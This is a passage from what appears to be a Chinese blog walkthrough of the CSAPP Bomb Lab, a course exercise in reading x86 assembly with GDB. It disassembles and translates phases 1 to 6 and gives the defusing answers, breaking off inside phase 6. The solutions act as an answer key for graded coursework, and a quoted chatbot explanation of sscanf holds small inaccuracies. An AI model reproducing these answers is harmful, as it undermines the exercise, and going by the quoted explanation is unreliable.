true，尽管锁实际上已经被释放了。这种情况可能导致被唤醒的任务无法正确获取锁，因为它会认为锁仍然被其他线程持有，从而再次进入等待队列。这会导致死锁或无限循环。\n","categories":["操作系统"],"tags":["Rust","操作系统","经验"]},{"title":"CSAPP Bomb Lab","url":"/2024/09/17/CSAPP-Bomb-Lab/","content":"\n本 Lab 可以说是 CSAPP 的几个 Lab 中最为人津津乐道的一个，对应知识点为书中的第 3 章（程序的机器级表示），要求使用 GDB 调试器，对汇编语言进行调试，从而得出正确的“拆弹密码”。共分为 6 个关卡和一个隐藏关卡，每个关卡都分别考察了一种语法结构或数据结构的汇编表示，部分关卡逻辑比较复杂，要求对 x86 汇编有一定的熟悉度。\nbomb.cint main(int argc, char *argv[])&#123;    char *input;    /* Note to self: remember to port this bomb to Windows and put a     * fantastic GUI on it. */    /* When run with no arguments, the bomb reads its input lines     * from standard input. */    if (argc == 1) &#123;        infile = stdin;    &#125;    /* When run with one argument &lt;file&gt;, the bomb reads from &lt;file&gt;     * until EOF, and then switches to standard input. Thus, as you     * defuse each phase, you can add its defusing string to &lt;file&gt; and     * avoid having to retype it. */    else if (argc == 2) &#123;        if (!(infile = fopen(argv[1], &quot;r&quot;))) &#123;            printf(&quot;%s: Error: Couldn&#x27;t open %s\\n&quot;, argv[0], argv[1]);            exit(8);        &#125;    &#125;    /* You can&#x27;t call the bomb with more than 1 command line argument. */    else &#123;        printf(&quot;Usage: %s [&lt;input_file&gt;]\\n&quot;, argv[0]);        exit(8);    &#125;    /* Do all sorts of secret stuff that makes the bomb harder to defuse. */    initialize_bomb();    printf(&quot;Welcome to my fiendish little bomb. You have 6 phases with\\n&quot;);    printf(&quot;which to blow yourself up. Have a nice day!\\n&quot;);    /* Hmm...  Six phases must be more secure than one phase! */    input = read_line();             /* Get input                   */    phase_1(input);                  /* Run the phase               */    phase_defused();                 /* Drat!  They figured it out!                                      * Let me know how they did it. */    printf(&quot;Phase 1 defused. How about the next one?\\n&quot;);    /* The second phase is harder.  No one will ever figure out     * how to defuse this... */    input = read_line();    phase_2(input);    phase_defused();    printf(&quot;That&#x27;s number 2.  Keep going!\\n&quot;);    /* I guess this is too easy so far.  Some more complex code will     * confuse people. */    input = read_line();    phase_3(input);    phase_defused();    printf(&quot;Halfway there!\\n&quot;);    /* Oh yeah?  Well, how good is your math?  Try on this saucy problem! */    input = read_line();    phase_4(input);    phase_defused();    printf(&quot;So you got that one.  Try this one.\\n&quot;);    /* Round and &#x27;round in memory we go, where we stop, the bomb blows! */    input = read_line();    phase_5(input);    phase_defused();    printf(&quot;Good work!  On to the next...\\n&quot;);    /* This phase will never be used, since no one will get past the     * earlier ones.  But just in case, make this one extra hard. */    input = read_line();    phase_6(input);    phase_defused();    /* Wow, they got it!  But isn&#x27;t something... missing?  Perhaps     * something they overlooked?  Mua ha ha ha ha! */    return 0;&#125;\n首先观察 bomb.c 的 main 函数结构，最开始判断 argc 是否为 1，如果为 1，表示运行 bomb 程序时没有指定命令行参数，即从标准输入中读取 “拆弹密码”；否则，从指定的文件中读取。为了后续调试的方便，可以将所有的密码写入一个文件 ans.txt 中，后续在启动 bomb 程序时对其指定：./bomb ans.txt.\n随后便是初始化“炸弹”，每次读取一行密码，利用该密码进行“拆弹”，如果正确，则进入下一关卡，否则，“炸弹”就会爆炸，“拆弹”失败。一次性输对 6 个密码后，“炸弹”就会被“拆除”。\n注意最后的注释：\n\nWow, they got it!  But isn’t something… missing?  Perhaps something they overlooked?  Mua ha ha ha ha!\n\n一定程度上暗示了隐藏关卡的存在。\nphase_1每次拆弹时，可以使用 disas 命令进行反汇编，查看函数对应的汇编代码，以下是 disas phase_1 的结果：\n0x0000000000400ee0 &lt;+0&gt;:     sub    $0x8,%rsp0x0000000000400ee4 &lt;+4&gt;:     mov    $0x402400,%esi0x0000000000400ee9 &lt;+9&gt;:     call   0x401338 &lt;strings_not_equal&gt;0x0000000000400eee &lt;+14&gt;:    test   %eax,%eax0x0000000000400ef0 &lt;+16&gt;:    je     0x400ef7 &lt;phase_1+23&gt;0x0000000000400ef2 &lt;+18&gt;:    call   0x40143a &lt;explode_bomb&gt;0x0000000000400ef7 &lt;+23&gt;:    add    $0x8,%rsp0x0000000000400efb &lt;+27&gt;:    ret\n热身关卡，代码的逻辑很简单，读取一行密码，判断该密码与事先指定的字符串是否相同，如果不相同，则“引爆炸弹”。\n这里需要熟悉 x86 寄存器的使用惯例（也可以 GDB 自行调试），寄存器 %rdi 寄存器 %rsi 分别作为函数调用时的参数 1 和参数 2。在这里，%rdi 存储着读取到的密码字符串（准确来说，是字符串首字母的地址），而 %rsi 则被赋值为 0x402400，然后，将这两个地址作为参数 1 和参数 2，调用 string_not_equal，从函数名称上看，该函数用来判定两个字符串是否相同。那么思路就很清晰了，密码就是地址 0x402400 处的字符串值，使用 x/s 0x402400 查看即可。\n\nphase_20x0000000000400efc &lt;+0&gt;:     push   %rbp0x0000000000400efd &lt;+1&gt;:     push   %rbx0x0000000000400efe &lt;+2&gt;:     sub    $0x28,%rsp0x0000000000400f02 &lt;+6&gt;:     mov    %rsp,%rsi0x0000000000400f05 &lt;+9&gt;:     call   0x40145c &lt;read_six_numbers&gt;0x0000000000400f0a &lt;+14&gt;:    cmpl   $0x1,(%rsp)0x0000000000400f0e &lt;+18&gt;:    je     0x400f30 &lt;phase_2+52&gt;0x0000000000400f10 &lt;+20&gt;:    call   0x40143a &lt;explode_bomb&gt;0x0000000000400f15 &lt;+25&gt;:    jmp    0x400f30 &lt;phase_2+52&gt;0x0000000000400f17 &lt;+27&gt;:    mov    -0x4(%rbx),%eax0x0000000000400f1a &lt;+30&gt;:    add    %eax,%eax0x0000000000400f1c &lt;+32&gt;:    cmp    %eax,(%rbx)0x0000000000400f1e &lt;+34&gt;:    je     0x400f25 &lt;phase_2+41&gt;0x0000000000400f20 &lt;+36&gt;:    call   0x40143a &lt;explode_bomb&gt;0x0000000000400f25 &lt;+41&gt;:    add    $0x4,%rbx0x0000000000400f29 &lt;+45&gt;:    cmp    %rbp,%rbx0x0000000000400f2c &lt;+48&gt;:    jne    0x400f17 &lt;phase_2+27&gt;0x0000000000400f2e &lt;+50&gt;:    jmp    0x400f3c &lt;phase_2+64&gt;0x0000000000400f30 &lt;+52&gt;:    lea    0x4(%rsp),%rbx0x0000000000400f35 &lt;+57&gt;:    lea    0x18(%rsp),%rbp0x0000000000400f3a &lt;+62&gt;:    jmp    0x400f17 &lt;phase_2+27&gt;0x0000000000400f3c &lt;+64&gt;:    add    $0x28,%rsp0x0000000000400f40 &lt;+68&gt;:    pop    %rbx0x0000000000400f41 &lt;+69&gt;:    pop    %rbp0x0000000000400f42 &lt;+70&gt;:    ret\n这一关主要是考察 循环语句 ，可以仔细阅读书中第 3.6.7 节，加强对汇编的循环结构的熟悉程度，如果感觉思路很乱，可以采用与书中类似的方法：先将汇编翻译为等价的带 goto 的高级语言，再参考几种典型的循环形式，将 goto 改写为循环结构，以下便是最终翻译得到的类 C 语言伪代码：\nread_six_numbers();if (Mem[%rsp] != 1) &#123;    explode_bomb();&#125;for (%rbx = %rsp + 4, %rbp = %rsp + 24; %rbx != %rbp; %rbx += 4) &#123;    %eax = Mem[%rbx - 4];  // 上一个元素    %eax *= 2;    if (Mem[%rbx] != %eax) &#123;        explode_bomb();    &#125;&#125;\n首先注意到 read_six_numbers() 函数，字面意思是读取 6 个数字，推测密码由 6 个数字组成。\n然后判断 Mem[%rsp] 的值是否为 1，不是则“爆炸”。这里可以善用 GDB，先随便蒙 6 个数字，然后使用 p/x 打印 Mem[%rsp] 的值，发现其值正好等于输入的第一个数字，结合后面的 6 次循环可知，输入的第 i （i 从 0 开始）个数字存储在地址 %rsp + 4 * i 处，且每个数字都必须为它前一个数字的两倍。\n那么代码逻辑便理清楚了：输入的第一个数字为 1，其后每一个数字都为前一个数字的两倍，密码为：1 2 4 8 16 32.\nphase_30x0000000000400f43 &lt;+0&gt;:     sub    $0x18,%rsp0x0000000000400f47 &lt;+4&gt;:     lea    0xc(%rsp),%rcx0x0000000000400f4c &lt;+9&gt;:     lea    0x8(%rsp),%rdx0x0000000000400f51 &lt;+14&gt;:    mov    $0x4025cf,%esi0x0000000000400f56 &lt;+19&gt;:    mov    $0x0,%eax0x0000000000400f5b &lt;+24&gt;:    call   0x400bf0 &lt;__isoc99_sscanf@plt&gt;0x0000000000400f60 &lt;+29&gt;:    cmp    $0x1,%eax0x0000000000400f63 &lt;+32&gt;:    jg     0x400f6a &lt;phase_3+39&gt;0x0000000000400f65 &lt;+34&gt;:    call   0x40143a &lt;explode_bomb&gt;0x0000000000400f6a &lt;+39&gt;:    cmpl   $0x7,0x8(%rsp)0x0000000000400f6f &lt;+44&gt;:    ja     0x400fad &lt;phase_3+106&gt;0x0000000000400f71 &lt;+46&gt;:    mov    0x8(%rsp),%eax0x0000000000400f75 &lt;+50&gt;:    jmp    *0x402470(,%rax,8)0x0000000000400f7c &lt;+57&gt;:    mov    $0xcf,%eax0x0000000000400f81 &lt;+62&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;0x0000000000400f83 &lt;+64&gt;:    mov    $0x2c3,%eax0x0000000000400f88 &lt;+69&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;0x0000000000400f8a &lt;+71&gt;:    mov    $0x100,%eax0x0000000000400f8f &lt;+76&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;0x0000000000400f91 &lt;+78&gt;:    mov    $0x185,%eax0x0000000000400f96 &lt;+83&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;0x0000000000400f98 &lt;+85&gt;:    mov    $0xce,%eax0x0000000000400f9d &lt;+90&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;0x0000000000400f9f &lt;+92&gt;:    mov    $0x2aa,%eax0x0000000000400fa4 &lt;+97&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;0x0000000000400fa6 &lt;+99&gt;:    mov    $0x147,%eax0x0000000000400fab &lt;+104&gt;:   jmp    0x400fbe &lt;phase_3+123&gt;0x0000000000400fad &lt;+106&gt;:   call   0x40143a &lt;explode_bomb&gt;0x0000000000400fb2 &lt;+111&gt;:   mov    $0x0,%eax0x0000000000400fb7 &lt;+116&gt;:   jmp    0x400fbe &lt;phase_3+123&gt;0x0000000000400fb9 &lt;+118&gt;:   mov    $0x137,%eax0x0000000000400fbe &lt;+123&gt;:   cmp    0xc(%rsp),%eax0x0000000000400fc2 &lt;+127&gt;:   je     0x400fc9 &lt;phase_3+134&gt;0x0000000000400fc4 &lt;+129&gt;:   call   0x40143a &lt;explode_bomb&gt;0x0000000000400fc9 &lt;+134&gt;:   add    $0x18,%rsp0x0000000000400fcd &lt;+138&gt;:   ret\n这一关的代码量比较大，但是中间一段看起来很有规律，尤其注意这一句：jmp  *0x402470(, %rax, 8)，直接根据 %rax 寄存器的值计算偏移量进行跳转，这便是 switch 语句 所采用的跳转方式，地址 0x402470 即跳转表的首地址。\n另外，还需要关注的一条指令是 call   0x400bf0 &lt;__isoc99_sscanf@plt&gt;，貌似是一个函数调用指令，以下是我借助大语言模型得到的解释：\n\n__isoc99_sscanf@plt 是一个指向 sscanf 函数的 PLT（Procedure Linkage Table）入口点的符号引用。sscanf 函数是 C 语言标准库中的一个函数，用于从输入流中按照指定格式读取数据。@plt 表示这是一个通过动态链接的程序跳转表（Procedure Linkage Table）来调用的函数。\n参数传递在 x86-64 架构中，函数参数通常是通过寄存器传递的。对于 sscanf 函数，它的参数如下：\n\n%rdi：第一个参数，通常是文件描述符或指针类型。对于 sscanf，这是指向输入字符串的指针。\n%rsi：第二个参数，指向格式化字符串的指针。\n%rdx：第三个参数，如果有的话，指向第一个要填充的变量的地址。\n更多的参数会继续使用后续的寄存器 %rcx, %r8, 和 %r9。如果参数超过六个，那么它们将会通过栈传递。\n\n返回值在 x86-64 架构中，返回值会被放在 %rax 寄存器中。sscanf 返回成功匹配和赋值的项数，如果没有任何匹配，则返回零。如果输入结束前格式化字符串就被耗尽了，也返回零。如果遇到任何读取错误（如读取一个整数但输入不是有效的整数），则返回负数。\n\n简而言之，sscanf 类似于 scanf，只是输入从标准输入变成了指定的字符串。在这里，sscanf 指定了 4 个参数，作用为：从 %rdi 寄存器指向的字符串中进行读取，%rsi 指向格式化字符串，%rdx 和 %rcx 分别指向被格式化读取到的变量 1 和变量 2. 若读取成功，则返回成功读取的项数，即为 2，存入 %rax 寄存器中。\n查看 0x4025cf 处的字符串，即格式化字符串，为 %d %d，说明读取的两个值都为十进制整数，即本关密码的形式。\n\n最后查看一下整张跳转表的值，根据最终跳转到的位置确定输入的值。\n\n然后将其改写为 switch 语句，下面直接给出完整代码的翻译结果：\n%rcx = %rsp + 12;%rdx = %rsp + 8;%esi = 0x4025cf;%eax = 0;sscanf(%rdi, %rsi, %rdx, %rcx);if (%eax &lt;= 1) &#123;          // 读取成功的值个数小于2    explode_bomb();&#125;if (Mem[%rsp + 8] &gt; 7u) &#123; // 读取到的（输入的）第一个值大于7或小于0    explode_bomb();&#125;%eax = Mem[%rsp + 8];switch (%rax) &#123;    case 0:        %eax = 0xcf;  break;    case 1:        %eax = 0x137; break;    case 2:        %eax = 0x2c3; break;    case 3:        %eax = 0x100; break;    case 4:        %eax = 0x185; break;    case 5:        %eax = 0xce;  break;    case 6:        %eax = 0x2aa; break;    case 7:    \t%eax = 0x147; break;&#125;// 输入的第二个值等于%eax寄存器的值if (%eax != Mem[%rsp + 12]) &#123;    explode_bomb();&#125;\n要使得 %eax 的值等于输入的第二个值，只需要保证输入的第一个值经过 switch 语句选择之后，赋值正好等于输入的第二个值。\n因此本关的答案并不是固定的，0 207、 3 256 等等都是正确答案。注意不能写成 0 0xcf、3 0x100，因为输入格式为十进制整数，需要将十六进制进行转换。\nphase_40x000000000040100c &lt;+0&gt;:     sub    $0x18,%rsp0x0000000000401010 &lt;+4&gt;:     lea    0xc(%rsp),%rcx0x0000000000401015 &lt;+9&gt;:     lea    0x8(%rsp),%rdx0x000000000040101a &lt;+14&gt;:    mov    $0x4025cf,%esi0x000000000040101f &lt;+19&gt;:    mov    $0x0,%eax0x0000000000401024 &lt;+24&gt;:    call   0x400bf0 &lt;__isoc99_sscanf@plt&gt;0x0000000000401029 &lt;+29&gt;:    cmp    $0x2,%eax0x000000000040102c &lt;+32&gt;:    jne    0x401035 &lt;phase_4+41&gt;0x000000000040102e &lt;+34&gt;:    cmpl   $0xe,0x8(%rsp)0x0000000000401033 &lt;+39&gt;:    jbe    0x40103a &lt;phase_4+46&gt;0x0000000000401035 &lt;+41&gt;:    call   0x40143a &lt;explode_bomb&gt;0x000000000040103a &lt;+46&gt;:    mov    $0xe,%edx0x000000000040103f &lt;+51&gt;:    mov    $0x0,%esi0x0000000000401044 &lt;+56&gt;:    mov    0x8(%rsp),%edi0x0000000000401048 &lt;+60&gt;:    call   0x400fce &lt;func4&gt;0x000000000040104d &lt;+65&gt;:    test   %eax,%eax0x000000000040104f &lt;+67&gt;:    jne    0x401058 &lt;phase_4+76&gt;0x0000000000401051 &lt;+69&gt;:    cmpl   $0x0,0xc(%rsp)0x0000000000401056 &lt;+74&gt;:    je     0x40105d &lt;phase_4+81&gt;0x0000000000401058 &lt;+76&gt;:    call   0x40143a &lt;explode_bomb&gt;0x000000000040105d &lt;+81&gt;:    add    $0x18,%rsp0x0000000000401061 &lt;+85&gt;:    ret\n这一关主要分成两个函数：phase_4 和 func_4，首先查看 phase_4，代码前一段和 phase_3 非常类似：读取两个整数，且保证输入的第一个值位于区间 [0, 15) 内。\n%rcx = %rsp + 12;%rdx = %rsp + 8;%esi = 0x4025cf;%eax = 0;sscanf(%rdi, %rsi, %rdx, %rcx);if (%eax != 2) &#123;    explode_bomb();&#125;if (Mem[%rsp + 8] &gt;= 15u) &#123;\texplode_bomb();&#125;%edx = 0xe;%esi = 0;%edi = Mem[%rsp + 8];func4(%rdi, %rsi, %rdx); // func4(Mem[%rsp+8], 0, 14)if (%eax != 0) &#123;    explode_bomb();&#125;if (Mem[%rsp + 12] != 0) &#123;    explode_bomb();&#125;\n后一段便是传递 3 个参数给函数 func_4 进行调用，需要保证返回值和输入的第二个数为 0，因此密码的第二个数为 0。可以看到，phase_4 的代码结构还是很简单易懂的，关键是对 func_4 函数的分析。\n0x0000000000400fce &lt;+0&gt;:     sub    $0x8,%rsp0x0000000000400fd2 &lt;+4&gt;:     mov    %edx,%eax0x0000000000400fd4 &lt;+6&gt;:     sub    %esi,%eax0x0000000000400fd6 &lt;+8&gt;:     mov    %eax,%ecx0x0000000000400fd8 &lt;+10&gt;:    shr    $0x1f,%ecx0x0000000000400fdb &lt;+13&gt;:    add    %ecx,%eax0x0000000000400fdd &lt;+15&gt;:    sar    %eax0x0000000000400fdf &lt;+17&gt;:    lea    (%rax,%rsi,1),%ecx0x0000000000400fe2 &lt;+20&gt;:    cmp    %edi,%ecx0x0000000000400fe4 &lt;+22&gt;:    jle    0x400ff2 &lt;func4+36&gt;0x0000000000400fe6 &lt;+24&gt;:    lea    -0x1(%rcx),%edx0x0000000000400fe9 &lt;+27&gt;:    call   0x400fce &lt;func4&gt;0x0000000000400fee &lt;+32&gt;:    add    %eax,%eax0x0000000000400ff0 &lt;+34&gt;:    jmp    0x401007 &lt;func4+57&gt;0x0000000000400ff2 &lt;+36&gt;:    mov    $0x0,%eax0x0000000000400ff7 &lt;+41&gt;:    cmp    %edi,%ecx0x0000000000400ff9 &lt;+43&gt;:    jge    0x401007 &lt;func4+57&gt;0x0000000000400ffb &lt;+45&gt;:    lea    0x1(%rcx),%esi0x0000000000400ffe &lt;+48&gt;:    call   0x400fce &lt;func4&gt;0x0000000000401003 &lt;+53&gt;:    lea    0x1(%rax,%rax,1),%eax0x0000000000401007 &lt;+57&gt;:    add    $0x8,%rsp0x000000000040100b &lt;+61&gt;:    ret\n仔细观察 func_4 的代码，发现含有对 func_4 的调用，因此 func_4 是一个 递归 函数。在对递归函数进行翻译时，本质上与普通的函数并没有区别，结果如下：\nint func4(int a, int b, int c) &#123;    int res = c - b;    int temp = (unsigned)res &gt;&gt; 31;    res += temp;    res &gt;&gt;= 1;    temp = b + res;    if (temp &gt; a) &#123;        c = temp - 1;        res = func4(a, b, c);        res *= 2;    &#125;    else &#123;        res = 0;        if (temp &lt; a) &#123;            b = temp + 1;            res = func4(a, b, c);            res = 2 * res + 1;        &#125;    &#125;    return res;&#125;\n可以看到，程序的逻辑还是比较复杂的，但是注意到参数 b 和 c 的值都是确定的，真正的变量只有参数 a。因此这里有一个偷懒的办法：将程序翻译为一个语法严格正确的高级语言程序（而不是之前的伪代码），然后枚举所有可能的 a（只有 15 中情况），运行测试即可，结果为 0 的即为满足要求的值，也就是密码的第一个数。\n\n可见，本关的正解同样不止一个，1 0、3 0、7 0 都是正确答案。\nphase_50x0000000000401062 &lt;+0&gt;:     push   %rbx0x0000000000401063 &lt;+1&gt;:     sub    $0x20,%rsp0x0000000000401067 &lt;+5&gt;:     mov    %rdi,%rbx0x000000000040106a &lt;+8&gt;:     mov    %fs:0x28,%rax0x0000000000401073 &lt;+17&gt;:    mov    %rax,0x18(%rsp)0x0000000000401078 &lt;+22&gt;:    xor    %eax,%eax0x000000000040107a &lt;+24&gt;:    call   0x40131b &lt;string_length&gt;0x000000000040107f &lt;+29&gt;:    cmp    $0x6,%eax0x0000000000401082 &lt;+32&gt;:    je     0x4010d2 &lt;phase_5+112&gt;0x0000000000401084 &lt;+34&gt;:    call   0x40143a &lt;explode_bomb&gt;0x0000000000401089 &lt;+39&gt;:    jmp    0x4010d2 &lt;phase_5+112&gt;0x000000000040108b &lt;+41&gt;:    movzbl (%rbx,%rax,1),%ecx0x000000000040108f &lt;+45&gt;:    mov    %cl,(%rsp)0x0000000000401092 &lt;+48&gt;:    mov    (%rsp),%rdx0x0000000000401096 &lt;+52&gt;:    and    $0xf,%edx0x0000000000401099 &lt;+55&gt;:    movzbl 0x4024b0(%rdx),%edx0x00000000004010a0 &lt;+62&gt;:    mov    %dl,0x10(%rsp,%rax,1)0x00000000004010a4 &lt;+66&gt;:    add    $0x1,%rax0x00000000004010a8 &lt;+70&gt;:    cmp    $0x6,%rax0x00000000004010ac &lt;+74&gt;:    jne    0x40108b &lt;phase_5+41&gt;0x00000000004010ae &lt;+76&gt;:    movb   $0x0,0x16(%rsp)0x00000000004010b3 &lt;+81&gt;:    mov    $0x40245e,%esi0x00000000004010b8 &lt;+86&gt;:    lea    0x10(%rsp),%rdi0x00000000004010bd &lt;+91&gt;:    call   0x401338 &lt;strings_not_equal&gt;0x00000000004010c2 &lt;+96&gt;:    test   %eax,%eax0x00000000004010c4 &lt;+98&gt;:    je     0x4010d9 &lt;phase_5+119&gt;0x00000000004010c6 &lt;+100&gt;:   call   0x40143a &lt;explode_bomb&gt;0x00000000004010cb &lt;+105&gt;:   nopl   0x0(%rax,%rax,1)0x00000000004010d0 &lt;+110&gt;:   jmp    0x4010d9 &lt;phase_5+119&gt;0x00000000004010d2 &lt;+112&gt;:   mov    $0x0,%eax0x00000000004010d7 &lt;+117&gt;:   jmp    0x40108b &lt;phase_5+41&gt;0x00000000004010d9 &lt;+119&gt;:   mov    0x18(%rsp),%rax0x00000000004010de &lt;+124&gt;:   xor    %fs:0x28,%rax0x00000000004010e7 &lt;+133&gt;:   je     0x4010ee &lt;phase_5+140&gt;0x00000000004010e9 &lt;+135&gt;:   call   0x400b30 &lt;__stack_chk_fail@plt&gt;0x00000000004010ee &lt;+140&gt;:   add    $0x20,%rsp0x00000000004010f2 &lt;+144&gt;:   pop    %rbx0x00000000004010f3 &lt;+145&gt;:   ret\n这一关的汇编代码逻辑不算复杂，我们主要关注翻译后的代码：\n%rbx = %rdi;Mem[%rsp + 0x18] = Mem[%fs + 0x28]; // 4Byte%eax ^= %eax;  \t\t\t\t\t\t// %eax = 0if (string_length() != 6) &#123;\texplode_bomb();&#125;for (%eax = 0; %eax != 6; ++%eax) &#123;    %edx = Mem[%rbx + %rax] &amp; 0xf;    Mem[%rsp + %rax + 0x10] = Mem[0x4024b0 + %rdx]; // 1Byte&#125;Mem[%rsp + 0x16] = 0;%esi = 0x40245e;%rdi = %rsp + 0x10;if (string_not_equal(%rdi, %esi) != 0) &#123;\texplode_bomb();&#125;%rax = Mem[%rsp + 0x18] ^ Mem[%fs + 0x28];if (%rax != 0) &#123;\t__stack_chk_fail();&#125;\n从 if (string_length() != 6) explode_bomb(); 可以看出密码是一个长度为 6 的字符串，随后的 for 循环遍历字符串的各个字符，提取低一字节的值 %edx，将其作为相对于地址 0x4024b0 的偏移量，读取目标地址 0x4020b0 + %rdx 处的低 4 位数据，存入地址 %rsp + %rax + 0x10 处，构造出一个起始地址为 %rsp + 0x10 的长度为 6 的字符串。然后将起始地址为 %rsp + 0x10 的字符串与起始地址为 0x40245e 的字符串作比较，如果不相同，则“引爆炸弹”。最后进行缓冲区溢出检测，如果溢出，则调用 __stack_chk_fail().\n经过以上的描述，不难看出输入的 6 位字符串其实是一个相对于数组 0x4024b0 的索引，只不过索引值不直接给出，而是等于字符的低 4 位值。本关的目标便是使得输入的 6 位索引经过映射之后得到的字符串正好等于地址 0x40245e 的字符串，即 \\”flyers\\”.\n\n以字符 f 为例，f 在 array 表中的（最小）索引为 9，而所有低 4 位等于 9（1001）的字符都满足条件，例如 i .\n\n\n\n\n字符c1\n索引\n字符c2\n\n\n\n\nf\n9\ni\n\n\nl\n15\no\n\n\ny\n14\nn\n\n\ne\n5\ne\n\n\nr\n6\nf\n\n\ns\n7\ng\n\n\n\n\n依次类推，一个满足条件的密码为：ionefg .\nphase_6最复杂的一关，代码量非常大，而且逻辑比较复杂，整体观察比较困难，可以先将代码按照循环块拆分为几个部分，依次进行分析。\n在使用 GDB 调试的时候，可以为每个块的起始部分分别打上断点，同时为了调试的方便，可将这些命令写入 .gdbinit 中。\nb phase_6b *0x401153b *0x40116fb *0x4011abb *0x4011d2r ./ans.txt\nblock_10x00000000004010f4 &lt;+0&gt;:     push   %r140x00000000004010f6 &lt;+2&gt;:     push   %r130x00000000004010f8 &lt;+4&gt;:     push   %r120x00000000004010fa &lt;+6&gt;:     push   %rbp0x00000000004010fb &lt;+7&gt;:     push   %rbx0x00000000004010fc &lt;+8&gt;:     sub    $0x50,%rsp0x0000000000401100 &lt;+12&gt;:    mov    %rsp,%r130x0000000000401103 &lt;+15&gt;:    mov    %rsp,%rsi0x0000000000401106 &lt;+18&gt;:    call   0x40145c &lt;read_six_numbers&gt;0x000000000040110b &lt;+23&gt;:    mov    %rsp,%r140x000000000040110e &lt;+26&gt;:    mov    $0x0,%r12d0x0000000000401114 &lt;+32&gt;:    mov    %r13,%rbp0x0000000000401117 &lt;+35&gt;:    mov    0x0(%r13),%eax0x000000000040111b &lt;+39&gt;:    sub    $0x1,%eax0x000000000040111e &lt;+42&gt;:    cmp    $0x5,%eax0x0000000000401121 &lt;+45&gt;:    jbe    0x401128 &lt;phase_6+52&gt;0x0000000000401123 &lt;+47&gt;:    call   0x40143a &lt;explode_bomb&gt;0x0000000000401128 &lt;+52&gt;:    add    $0x1,%r12d0x000000000040112c &lt;+56&gt;:    cmp    $0x6,%r12d0x0000000000401130 &lt;+60&gt;:    je     0x401153 &lt;phase_6+95&gt;0x0000000000401132 &lt;+62&gt;:    mov    %r12d,%ebx0x0000000000401135 &lt;+65&gt;:    movslq %ebx,%rax0x0000000000401138 &lt;+68&gt;:    mov    (%rsp,%rax,4),%eax0x000000000040113b &lt;+71&gt;:    cmp    %eax,0x0(%rbp)0x000000000040113e &lt;+74&gt;:    jne    0x401145 &lt;phase_6+81&gt;0x0000000000401140 &lt;+76&gt;:    call   0x40143a &lt;explode_bomb&gt;0x0000000000401145 &lt;+81&gt;:    add    $0x1,%ebx0x0000000000401148 &lt;+84&gt;:    cmp    $0x5,%ebx0x000000000040114b &lt;+87&gt;:    jle    0x401135 &lt;phase_6+65&gt;0x000000000040114d &lt;+89&gt;:    add    $0x4,%r130x0000000000401151 &lt;+93&gt;:    jmp    0x401114 &lt;phase_6+32&gt;\n第一部分整体而言不算太复杂，直接查看翻译后的代码：\n// 读取6个4Byte数字放入从%r14寄存器指向地址开始的内存空间中%r13 = %rsp;%rsi = %rsp;read_six_numbers();%r14 = %rsp;for (%r12d = 0; %r12 != 6; ) &#123;\t%rbp = %r13;    %eax = Mem[%r13];    %eax -= 1;    if (%eax &gt; 5u) &#123;        explode_bomb();    &#125;    %r12d += 1;    if (%r12d == 6) break;    for (%ebx = %r12d; %ebx &lt;= 5; ++%ebx) &#123;        %rax = %ebx;  // 符号扩展        %eax = Mem[4 * %rax + %rsp];        if (Mem[%rbp] == %eax) &#123;            explode_bomb();        &#125;\t&#125;\t%r13 += 4;&#125;\n与 phase_2 类似，首先读取 6 个数字，确定密码由 6 个数字组成。\n随后主要关注循环中导致触发 explode_bomb 的条件，这些条件指明了密码的限定范围。第一个是 %eax &gt; 5u，注意前一条指令是 %eax 自减一，因此可以确定 6 个数字的范围都是 [1, 6].\n\n这里自减一很有意思，刚开始看可能以为是多此一举，直接判断 %eax 是否大于 6u 不就完了吗？但是考虑到 0 这个特例，它在自减一后得到 -1，而 -1 满足无符号比较大于 5u，因此被排除在外。如果直接判断 %eax 是否大于 6u，那么数字的限定范围就变成了 [0, 6].\n\n后面的内层循环不难看出是用来判重的，因此六个数字的范围得以确定：每个数字都位于区间 [1, 6] 内且无重复数字。\nblock_20x0000000000401153 &lt;+95&gt;:    lea    0x18(%rsp),%rsi0x0000000000401158 &lt;+100&gt;:   mov    %r14,%rax0x000000000040115b &lt;+103&gt;:   mov    $0x7,%ecx0x0000000000401160 &lt;+108&gt;:   mov    %ecx,%edx0x0000000000401162 &lt;+110&gt;:   sub    (%rax),%edx0x0000000000401164 &lt;+112&gt;:   mov    %edx,(%rax)0x0000000000401166 &lt;+114&gt;:   add    $0x4,%rax0x000000000040116a &lt;+118&gt;:   cmp    %rsi,%rax0x000000000040116d &lt;+121&gt;:   jne    0x401160 &lt;phase_6+108&gt;\n// %r14 = %rsp// 遍历6个数字，每个数字num的值变为7-num%ecx = 7;for (%rax = %r14, %rsi = %rsp + 0x18; %rax != %rsi; %rax += 4) &#123;\t%edx = %ecx - Mem[%rax];\tMem[%rax] = %edx;&#125;\n第二部分非常简单，遍历输入的 6 个数字，将每个数字 num 更改为 7 - num.\nblock_30x000000000040116f &lt;+123&gt;:   mov    $0x0,%esi0x0000000000401174 &lt;+128&gt;:   jmp    0x401197 &lt;phase_6+163&gt;0x0000000000401176 &lt;+130&gt;:   mov    0x8(%rdx),%rdx0x000000000040117a &lt;+134&gt;:   add    $0x1,%eax0x000000000040117d &lt;+137&gt;:   cmp    %ecx,%eax0x000000000040117f &lt;+139&gt;:   jne    0x401176 &lt;phase_6+130&gt;0x0000000000401181 &lt;+141&gt;:   jmp    0x401188 &lt;phase_6+148&gt;0x0000000000401183 &lt;+143&gt;:   mov    $0x6032d0,%edx0x0000000000401188 &lt;+148&gt;:   mov    %rdx,0x20(%rsp,%rsi,2)0x000000000040118d &lt;+153&gt;:   add    $0x4,%rsi0x0000000000401191 &lt;+157&gt;:   cmp    $0x18,%rsi0x0000000000401195 &lt;+161&gt;:   je     0x4011ab &lt;phase_6+183&gt;0x0000000000401197 &lt;+163&gt;:   mov    (%rsp,%rsi,1),%ecx0x000000000040119a &lt;+166&gt;:   cmp    $0x1,%ecx0x000000000040119d &lt;+169&gt;:   jle    0x401183 &lt;phase_6+143&gt;0x000000000040119f &lt;+171&gt;:   mov    $0x1,%eax0x00000000004011a4 &lt;+176&gt;:   mov    $0x6032d0,%edx0x00000000004011a9 &lt;+181&gt;:   jmp    0x401176 